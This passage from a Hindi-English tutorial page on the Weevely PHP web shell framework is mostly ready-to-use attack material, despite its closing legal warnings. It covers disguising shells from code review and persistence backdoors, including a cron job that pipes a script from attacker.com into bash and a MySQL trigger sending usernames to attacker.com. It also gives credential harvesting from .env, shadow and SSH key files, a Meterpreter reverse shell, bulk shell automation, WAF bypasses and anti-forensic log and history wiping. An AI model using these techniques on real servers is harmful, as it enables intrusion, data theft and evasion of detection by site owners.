# <?php eval(base64_decode('d2hvYW1pOw==')); ?>

# 3. शेल को .inc या .phtml में रखो:
weevely generate pass /tmp/include.phtml

# 4. शेल को .htpasswd जैसा नाम दो:
weevely generate pass /tmp/.htpasswd.php

# 5. multiple extensions:
weevely generate pass /tmp/image.php.jpg
# Apache config पर depend करता है

# 6. Null byte injection (पुराने PHP में):
weevely generate pass /tmp/shell.php%00.jpg

# 7. शेल content में comments add करो:
# शेल generate करने के बाद manually comments add करो
# ताकि code review में suspicious न लगे`}
      />

      <h2>Backdoor Techniques</h2>
      <p>
        Weevely सिर्फ basic शेल नहीं है — यह advanced backdoor techniques support करता है। Reverse TCP shells, bind shells, और multi-stage payloads बना सकते हो। Backdoor persistence के लिए कई तरीके available हैं जैसे cron jobs, startup scripts, और database triggers।
      </p>
      <p>
        Backdoor techniques का चुनाव target environment पर depend करता है। अगर outbound connections allowed हैं तो reverse shell best है। अगर firewall outbound block करता है तो bind shell या HTTP-based backdoor use करो। Weevely का encrypted communication channel WAF और IDS से बचने में मदद करता है।
      </p>
      <CodeBlock
        title="एडवांस्ड बैकडोर तकनीकें"
        code={`# 1. Persistent backdoor — cron job:
:shell_sh
echo "*/5 * * * * curl http://attacker.com/check.sh | bash" | crontab -

# 2. PHP auto-prepend backdoor:
:file_write "<?php system($_GET['cmd']); ?>" /tmp/.backdoor.php
# php.ini में auto_prepend_file add करो:
:file_write "auto_prepend_file = /tmp/.backdoor.php" /tmp/custom.ini

# 3. Database trigger backdoor (MySQL):
:sql_console -user root -passwd pass
DELIMITER //
CREATE TRIGGER backdoor_trigger AFTER INSERT ON users
FOR EACH ROW BEGIN
  DECLARE cmd VARCHAR(255);
  SET cmd = CONCAT('curl http://attacker.com/log?user=', NEW.username);
  SELECT sys_exec(cmd) INTO @result;
END //
DELIMITER ;

# 4. .htaccess backdoor:
:file_write "AddType application/x-httpd-php .jpg" /var/www/html/.htaccess
# अब .jpg files PHP execute होंगी

# 5. Web.config backdoor (Windows IIS):
:file_write '<?xml version="1.0"?><configuration><system.webServer><handlers><add name="php" path="*.jpg" verb="*" modules="FastCgiModule" scriptProcessor="C:phpphp-cgi.exe" /></handlers></system.webServer></configuration>' /var/www/html/web.config

# 6. SSH key injection:
:file_write "ssh-rsa AAAAB3..." /root/.ssh/authorized_keys`}
      />

      <h2>Post-Exploitation Workflow</h2>
      <p>
        Weevely के साथ पोस्ट-एक्सप्लॉइटेशन का एक systematic workflow होना चाहिए। पहले system enumerate करो, फिर credentials खोजो, फिर lateral movement करो। हर step का output document करो — बाद में report लिखने में काम आएगा।
      </p>
      <CodeBlock
        title="सिस्टम एन्यूमरेशन"
        code={`# 1. बेसिक system info:
:shell_sh
uname -a
cat /etc/os-release
id
whoami

# 2. नेटवर्क info:
:shell_sh
ifconfig
ip addr
netstat -tulpn
cat /etc/hosts

# 3. यूज़र एन्यूमरेशन:
:shell_sh
cat /etc/passwd
cat /etc/shadow  # अगर root हो
last
w

# 4. प्रोसेस लिस्ट:
:shell_sh
ps aux
top -bn1

# 5. इंस्टॉल्ड सॉफ़्टवेयर:
:shell_sh
dpkg -l  # Debian/Ubuntu
rpm -qa  # CentOS/RHEL

# 6. क्रॉन जॉब्स:
:shell_sh
crontab -l
ls -la /etc/cron*

# 7. SUID फ़ाइलें:
:audit_suidsgid /

# 8. फ़ाइल सिस्टम ऑडिट:
:audit_filesystem /var/www`}
      />
      <CodeBlock
        title="क्रेडेंशियल हार्वेस्टिंग"
        code={`# 1. कॉन्फ़िग फ़ाइलों से पासवर्ड:
:file_grep "password" /var/www
:file_grep "passwd" /etc
:file_grep "secret" /var/www
:file_grep "api_key" /var/www
:file_grep "token" /var/www

# 2. डेटाबेस क्रेडेंशियल्स:
:file_read /var/www/html/wp-config.php
:file_read /var/www/html/config.php
:file_read /var/www/html/.env
:file_read /var/www/html/application/database.php

# 3. SSH keys:
:file_read /root/.ssh/id_rsa
:file_read /home/user/.ssh/id_rsa

# 4. ब्राउज़र पासवर्ड (अगर मिले):
:file_grep "login" /var/www/html/admin

# 5. लॉग फ़ाइलों से क्रेडेंशियल्स:
:file_grep "POST" /var/log/apache2/access.log
:file_grep "login" /var/log/nginx/access.log

# 6. Environment variables:
:shell_sh
env
printenv
cat /proc/self/environ`}
      />

      <h2>Real-World Case Studies</h2>
      <p>
        वास्तविक दुनिया में Weevely का उपयोग कई प्रकार के penetration testing engagements में होता है। एक common scenario है — web application testing के दौरान file upload vulnerability मिलती है। Tester Weevely से PHP शेल बनाकर upload करता है और फिर server पर persistent access प्राप्त करता है।
      </p>
      <p>
        एक real case में, security researcher ने e-commerce website की file upload functionality में bypass found किया। Weevely शेल upload करके, उसने database credentials extract किए और customer data access किया। यह सब authorized testing के तहत हुआ — client को detailed report दी गई जिसमें vulnerability और impact दोनों बताए गए।
      </p>
      <p>
        एक और case में, CMS (Content Management System) के plugin में vulnerability मिली। Weevely का उपयोग करके tester ने server access प्राप्त किया, internal network scan किया, और अन्य systems तक पहुँचा। इस engagement में Weevely के network scanning modules ने lateral movement में बहुत मदद की। इन cases से पता चलता है कि Weevely real-world testing में कितना powerful है।
      </p>

      <h2>Integration with Other Tools</h2>
      <p>
        Weevely अकेले नहीं बल्कि अन्य tools के साथ मिलकर ज़्यादा powerful बनता है। Metasploit, Burp Suite, Nmap, और SQLMap जैसे tools के साथ integration से complete attack chain बन सकता है।
      </p>
      <CodeBlock
        title="टूल्स इंटीग्रेशन"
        code={`# 1. Metasploit + Weevely:
# Weevely से Meterpreter payload upload करो:
msfvenom -p php/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f raw > meter.php
:file_upload meter.php /var/www/html/uploads/
# Metasploit listener:
msfconsole -q
use exploit/multi/handler
set payload php/meterpreter/reverse_tcp
set LHOST ATTACKER_IP
set LPORT 4444
exploit

# 2. Burp Suite + Weevely:
# Burp proxy से Weevely traffic route करो:
# weevely --proxy http://127.0.0.1:8080 URL PASSWORD
# या environment variable:
export http_proxy=http://127.0.0.1:8080

# 3. Nmap + Weevely:
# Weevely के net_scan को Nmap से replace करो:
# पहले Weevely से server access करो
# फिर Nmap binary upload करो:
:file_upload nmap /tmp/nmap
:shell_sh
chmod +x /tmp/nmap
/tmp/nmap -sV 192.168.1.0/24

# 4. SQLMap + Weevely:
# Weevely से database config निकालो
# फिर SQLMap से direct attack:
sqlmap -u "http://target.com/page?id=1" --dbms=mysql --threads=5

# 5. LinPEAS + Weevely:
# LinPEAS script upload करो:
:file_upload linpeas.sh /tmp/linpeas.sh
:shell_sh
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh > /tmp/linpeas_output.txt
:file_download /tmp/linpeas_output.txt`}
      />

      <h2>Scripting and Automation</h2>
      <p>
        Weevely को automate करने के लिए Python scripts लिखे जा सकते हैं। जब कई servers पर एक ही task करना हो तो automation बहुत ज़रूरी है। Weevely का Python API use करके custom modules भी बना सकते हो।
      </p>
      <CodeBlock
        title="ऑटोमेशन स्क्रिप्ट"
        code={`# Python automation script:
import subprocess
import sys

# शेल generate करो:
def generate_shell(password, output_path):
    cmd = ["weevely", "generate", password, output_path]
    result = subprocess.run(cmd, capture_output=True, text=True)
    return result.returncode == 0

# शेल से कनेक्ट करो और कमांड चलाओ:
def run_command(url, password, command):
    cmd = ["weevely", url, password, command]
    result = subprocess.run(cmd, capture_output=True, text=True)
    return result.stdout

# बल्क processing:
targets = [
    {"url": "http://site1.com/shell.php", "pass": "pass1"},
    {"url": "http://site2.com/shell.php", "pass": "pass2"},
    {"url": "http://site3.com/shell.php", "pass": "pass3"},
]

for target in targets:
    output = run_command(target["url"], target["pass"], "whoami")
    print(f"{target['url']}: {output}")

# bash automation:
#!/bin/bash
# generate_and_upload.sh
PASSWORD="mysecretpass"
OUTPUT="/tmp/shell.php"
TARGET="http://victim.com/uploads/"

weevely generate $PASSWORD $OUTPUT
curl -F "file=@$OUTPUT" $TARGET
weevely \${TARGET}shell.php $PASSWORD`}
      />
      <CodeBlock
        title="कस्टम मॉड्यूल बनाना"
        code={`# Weevely custom module structure:
# /usr/share/weevely/modules/custom/

# module.py example:
from weevely.core import modules

class CustomModule(modules.Module):
    def init(self):
        self.register_info({
            'name': 'custom_enum',
            'description': 'Custom enumeration module',
            'options': {
                'target': {
                    'description': 'Target path',
                    'required': True
                }
            }
        })

    def run(self, args):
        target = args.get('target', '/var/www')
        # Custom enumeration logic here
        return self.run_command(f"find {target} -name '*.conf'")

# Module install करो:
# custom.py को modules directory में copy करो
# Weevely automatic detect कर लेगा

# Module use करो:
# weevely> :custom_enum /var/www`}
      />

      <h2>Performance Tuning</h2>
      <p>
        Weevely की performance कई factors पर depend करती है — network latency, server load, और PHP configuration। Large files transfer करते समय performance optimize करना ज़रूरी है। Timeout settings और chunked transfers से performance बेहतर हो सकती है।
      </p>
      <ul className="list-disc list-inside text-gray-300 mb-4 space-y-2">
        <li><strong className="text-white">Network Timeout:</strong> slow connections पर timeout बढ़ाओ — default timeout fast networks के लिए है</li>
        <li><strong className="text-white">Chunked Transfer:</strong> बड़ी फ़ाइलें chunks में transfer करो — connection drop होने पर resume कर सकते हो</li>
        <li><strong className="text-white">Compression:</strong> PHP output compression enable करो — gzip से bandwidth बचता है</li>
        <li><strong className="text-white">Keep-Alive:</strong> HTTP keep-alive connection use करो — हर request पर new connection नहीं बनेगा</li>
        <li><strong className="text-white">Connection Pooling:</strong> multiple connections maintain करो — parallel operations के लिए</li>
        <li><strong className="text-white">Server Load:</strong> peak hours avoid करो — server busy होने पर slow response आएगा</li>
        <li><strong className="text-white">PHP Limits:</strong> memory_limit और max_execution_time check करो — large operations के लिए</li>
      </ul>

      <h2>Reporting and Output Analysis</h2>
      <p>
        Penetration testing के दौरान सभी findings document करना ज़रूरी है। Weevely का output capture करके report में include करो। हर command का output save करो — बाद में analysis और remediation के लिए काम आएगा।
      </p>
      <CodeBlock
        title="आउटपुट कैप्चर और रिपोर्टिंग"
        code={`# 1. Weevely session logging:
# weevely --log /tmp/weevely_session.log URL PASSWORD

# 2. Command output save करो:
# weevely URL PASSWORD "whoami" > /tmp/output.txt

# 3. सभी findings एक फ़ाइल में:
:shell_sh > /tmp/findings.txt
echo "=== System Info ===" >> /tmp/findings.txt
uname -a >> /tmp/findings.txt
id >> /tmp/findings.txt
cat /etc/passwd >> /tmp/findings.txt

# 4. File download for analysis:
:file_download /tmp/findings.txt

# 5. Screenshot capture (GUI में):
# Weevely CLI tool है — screenshots के लिए
# Burp Suite या browser use करो

# 6. Report template:
# Executive Summary
# Methodology
# Findings (Critical/High/Medium/Low)
# Evidence (screenshots, command outputs)
# Remediation Recommendations
# Appendix (raw data)`}
      />

      <h2>Advanced Techniques</h2>
      <CodeBlock
        title="WAF बाइपास तकनीकें"
        code={`# 1. User-Agent rotation:
# Weevely default User-Agent change करो:
# weevely --user-agent "Mozilla/5.0 (Windows NT 10.0)" URL PASS

# 2. URL encoding bypass:
# शेल path में URL encoding use करो:
# http://target.com/%75%70%6C%6F%61%64%73/shell.php

# 3. Case variation:
# Shell.php vs shell.PHP vs shell.PhP

# 4. Double encoding:
# %252e = %2e = .

# 5. Null byte (पुराने PHP):
# shell.php%00.jpg

# 6. Content-Type bypass:
# शेल को image/jpeg Content-Type से upload करो

# 7. Chunked transfer encoding:
# शेल को chunks में split करके upload करो

# 8. IP-based bypass:
# Cloudflare bypass — direct server IP find करो
# nslookup target.com
# weevely http://DIRECT_IP/shell.php pass`}
      />
      <CodeBlock
        title="एंटी-फोरेंसिक तकनीकें"
        code={`# 1. लॉग्स साफ़ करो:
:file_write "" /var/log/apache2/access.log
:file_write "" /var/log/apache2/error.log
:file_write "" /var/log/nginx/access.log
:file_write "" /var/log/auth.log

# 2. टाइमस्टैम्प restore करो:
# असली फ़ाइल का timestamp note करो
touch -r /var/www/html/index.php /var/www/html/shell.php

# 3. फ़ाइल metadata मिटाओ:
# PHP files में metadata नहीं होता
# लेकिन upload timestamps ज़रूरी हैं

# 4. Bash history साफ़ करो:
:shell_sh
history -c
cat /dev/null > ~/.bash_history
rm -f ~/.bash_history

# 5. Temp files cleanup:
:shell_sh
rm -f /tmp/shell.php
rm -f /tmp/output.txt
rm -f /tmp/findings.txt

# 6. Process hide:
# background processes में run करो
# ya process name change करो

# 7. Network traces:
# connection logs मिटाओ
# netstat output modify करो (advanced)`}
      />
      <CodeBlock
        title="मल्टी-स्टेज अटैक"
        code={`# Stage 1: Initial Access
# शेल generate करो और upload करो
weevely generate stage1pass /tmp/init.php
# Upload via vulnerability
weevely http://target.com/uploads/init.php stage1pass

# Stage 2: Enumeration
:audit_phpconf
:audit_filesystem /var/www
:net_scan 192.168.1.0/24 22,80,443,3306

# Stage 3: Credential Harvesting
:file_grep "password" /var/www
:file_grep "secret" /var/www
:sql_console -user root -passwd found_pass

# Stage 4: Lateral Movement
# नए credentials से दूसरे servers access करो
# SSH keys extract करो
:file_read /root/.ssh/id_rsa

# Stage 5: Persistence
# Cron job backdoor
# PHP auto-prepend backdoor
# Database trigger backdoor

# Stage 6: Data Exfiltration
:file_download /etc/passwd
:file_download /var/www/html/config.php
# Database dump:
:sql_console -user root -passwd pass
mysqldump --all-databases > /tmp/dump.sql
:file_download /tmp/dump.sql

# Stage 7: Cleanup
# सभी शेल्स delete करो
# Logs साफ़ करो
# Backdoors remove करो`}
      />

      <h2>Frequently Asked Questions</h2>
      <div className="space-y-3 mt-4">
        {[
          { q: 'क्या Weevely free है?', a: 'हाँ, पूरी तरह free और open source (GPLv3)। GitHub पर उपलब्ध है। कमर्शियल use भी free।' },
          { q: 'क्या real attacks में use कर सकते हैं?', a: 'नहीं! केवल authorized testing के लिए। बिना permission web shell बनाना illegal है।' },
          { q: 'कितने PHP versions support करता है?', a: 'PHP 5.6, 7.x, और 8.x support करता है। कुछ functions deprecated हो सकते हैं नए versions में।' },
          { q: 'Windows servers पर काम करता है?', a: 'हाँ, अगर PHP installed है तो Windows IIS/Apache दोनों पर काम करता है।' },
          { q: 'कितने शेल्स एक साथ manage कर सकते हैं?', a: 'Weevely sessions support करता है — एक साथ कई शेल्स connect कर सकते हो।' },
          { q: 'Python किस version चाहिए?', a: 'Python 3.6+ चाहिए। Python 2 support नहीं है Weevely 3 में।' },
          { q: 'HTTPS sites पर काम करता है?', a: 'हाँ, --verify-cert false flag use करो self-signed certificates के लिए।' },
          { q: 'क्या Weevely detect हो सकता है?', a: 'हाँ, advanced WAF और EDR solutions detect कर सकते हैं। इसलिए stealth techniques ज़रूरी हैं।' },
          { q: 'शेल कितने समय तक active रहता है?', a: 'जब तक server पर PHP enabled है और शेल delete नहीं हुआ। Server restart से शेल unaffected रहता है — यह persistent access है।' },
          { q: 'क्या Weevely IPv6 support करता है?', a: 'हाँ, IPv6 URLs support करता है। http://[::1]/shell.php format में URL दो।' },
          { q: 'शेल encrypted है तो WAF कैसे detect करता है?', a: 'WAF behavioral analysis use करता है — frequent POST requests, unusual file access patterns, और known obfuscation signatures detect करता है।' },
          { q: 'Weevely को update कैसे करें?', a: 'Git pull करो: cd weevely3 && git pull। नए modules और bug fixes मिलेंगे। apt update से भी latest version मिल सकता है।' },
        ].map((item, i) => (
          <div key={i} className="glass-card p-4">
            <h4 className="text-white font-mono font-semibold mb-2">Q: {item.q}</h4>
            <p className="text-gray-400 text-sm">A: {item.a}</p>
          </div>
        ))}
      </div>

      <h2>Alternatives</h2>
      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-neon-green/30">
              <th className="text-left py-2 px-3 text-neon-green">टूल</th>
              <th className="text-left py-2 px-3 text-neon-green">क्या करता है</th>
              <th className="text-left py-2 px-3 text-neon-green">खासियत</th>
            </tr>
          </thead>
          <tbody className="text-gray-400">
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">C99 Shell</td><td className="py-2 px-3">PHP वेब शेल (GUI)</td><td className="py-2 px-3">फुल फीचर्ड, GUI-based, पुराना</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">b374k</td><td className="py-2 px-3">PHP वेब शेल</td><td className="py-2 px-3">एन्क्रिप्टेड, GUI, छोटा</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">p0wny-shell</td><td className="py-2 px-3">PHP वेब शेल</td><td className="py-2 px-3">मॉडर्न UI, AJAX-based</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">Laudanum</td><td className="py-2 px-3">वेब शेल कलेक्शन</td><td className="py-2 px-3">PHP/ASP/JSP multi-language</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">Kali Webshells</td><td className="py-2 px-3">वेब शेल कलेक्शन</td><td className="py-2 px-3">Kali में pre-installed</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">Meterpreter PHP</td><td className="py-2 px-3">PHP payload</td><td className="py-2 px-3">Metasploit integration</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">Antak</td><td className="py-2 px-3">ASPX वेब शेल</td><td className="py-2 px-3">Windows IIS के लिए</td></tr>
            <tr><td className="py-2 px-3 text-white font-mono">China Chopper</td><td className="py-2 px-3">वेब शेल</td><td className="py-2 px-3">बहुत छोटा (~4 bytes)</td></tr>
          </tbody>
        </table>
      </div>

      <div className="info-box mt-6">
        <strong>💡 Pro Tips:</strong>
        <ul className="list-disc list-inside text-gray-300 mt-2 space-y-1">
          <li>हमेशा शेल का नाम रैंडम रखो — "shell.php" मत रखो, "config.inc.php" या "wp-settings.php" जैसा रखो</li>
          <li>टाइमस्टैम्प बदलो — :file_touch से पुरानी तारीख सेट करो ताकि शेल पुरानी फ़ाइल लगे</li>
          <li>uploads directory में .htaccess बनाओ जो PHP execution block करे — ताकि शेल execute न हो</li>
          <li>हमेशा cleanup करो — testing के बाद शेल डिलीट करो</li>
          <li>HTTPS sites पर --verify-cert false use करो self-signed certificates के लिए</li>
          <li>Python bindings से automation scripts बनाओ — batch processing के लिए</li>
          <li>:audit_phpconf से PHP configuration check करो पहले — disabled functions पता चलेंगे</li>
          <li>:file_grep से क्रेडेंशियल्स खोजो — config files, .env, wp-config.php</li>
          <li>multi-stage attack plan बनाओ — पहले enumerate, फिर credentials, फिर lateral movement</li>
          <li>हमेशा multiple backdoors रखो — एक detect हो जाए तो दूसरा काम करे</li>
          <li>reverse shell से पहले firewall rules check करो — outbound connections allowed हैं या नहीं</li>
          <li>WAF bypass के लिए User-Agent rotate करो — default Weevely UA suspicious लग सकता है</li>
          <li>शेल को हमेशा PHP-enabled directory में रखो — uploads folder best option है</li>
          <li>reporting के लिए सभी command outputs save करो — weevely --log flag use करो</li>
          <li>cleanup मत भूलो — testing के बाद सभी शेल्स और backdoors remove करो</li>
        </ul>
      </div>

      <h2>Legal and Ethical Considerations</h2>
      <p>
        Weevely का उपयोग केवल authorized penetration testing और security research के लिए होना चाहिए। बिना written permission के web shell बनाना और upload करना most countries में illegal है। India में IT Act 2000 की Section 43 और Section 66 के तहत unauthorized computer access serious offense है।
      </p>
      <p>
        Responsible disclosure practices follow करो — vulnerability मिलने पर vendor को inform करो public disclosure से पहले। Bug bounty programs में scope clearly defined होता है — scope से बाहर मत जाओ। Penetration testing agreement में rules of engagement clearly लिखे होने चाहिए — क्या allowed है और क्या नहीं। Scope creep से बचो — authorized systems पर ही test करो।
      </p>
      <p>
        Testing के बाद सभी shells, backdoors, और uploaded files remove करो। Client को complete report दो जिसमें findings, evidence, और remediation steps हों। Professional ethics maintain करो — access का misuse मत करो। Confidentiality agreement follow करो — client data third parties को मत दिखाओ।
      </p>

      <p>
        Web shell testing ethical hacking का एक important aspect है — responsibly करो।
      </p>
      <div className="warning-box mt-6">
        <strong>⚠️ फाइनल वार्निंग:</strong> Weevely एक शक्तिशाली वेब शेल मैनेजमेंट टूल है। इसका इस्तेमाल केवल अधिकृत पेनेट्रेशन टेस्टिंग और सुरक्षा शोध के लिए करें। बिना अनुमति के वेब शेल बनाना और अपलोड करना अवैध है। भारत में आईटी एक्ट 2000 की धारा 43 और 66 के तहत अनधिकृत वेब शेल अपराध हो सकता है। केवल अपने लैब वातावरण या लिखित प्राधिकरण के साथ ही उपयोग करें। हमेशा testing के बाद शेल cleanup करो — शेल छोड़ना भी अपराध हो सकता है।
      </div>
    </TutorialLayout>
  )
}
// Weevely — PHP Web Shell Management and Post-Exploitation Framework
